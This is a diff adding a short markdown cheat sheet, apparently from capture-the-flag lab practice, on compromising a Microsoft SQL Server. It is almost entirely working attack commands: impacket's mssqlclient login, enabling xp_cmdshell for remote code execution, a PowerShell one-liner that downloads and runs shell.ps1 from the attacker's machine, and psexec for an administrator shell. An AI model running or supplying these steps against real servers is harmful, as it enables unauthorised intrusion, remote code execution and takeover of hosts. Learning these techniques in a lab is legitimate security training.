@@ -1,0 +1,38 @@
+# SQL Server
+
+```markdown
+# connect to sqlserver with impacket
+> git clone https://github.com/SecureAuthCorp/impacket
+
+> mssqlclient.py USERNAME/sql_svc@10.10.10.27 -windows-auth
+
+# command IS_SRVROLEMEMBER to veryfy if the current user has ADMIN privileges
+> SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
+```
+
+```markdown
+# This code will activate xp_cmdshell and gain RCE on the host
+# will be sucefull if the host has administrative privileges
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell "whoami"
+```
+
+**UP A FILE SERVER in your machine**
+
+to pass the payload to the server to get a RCE
+
+```markdown
+# And download the file from your computer to the server and execute
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
+```
+
+to get a privilated shell on the server with *impacket*
+
+```markdown
+# Using the psexec.py to get privilaged shell
+> psexec.py administrator@10.10.10.27
+```
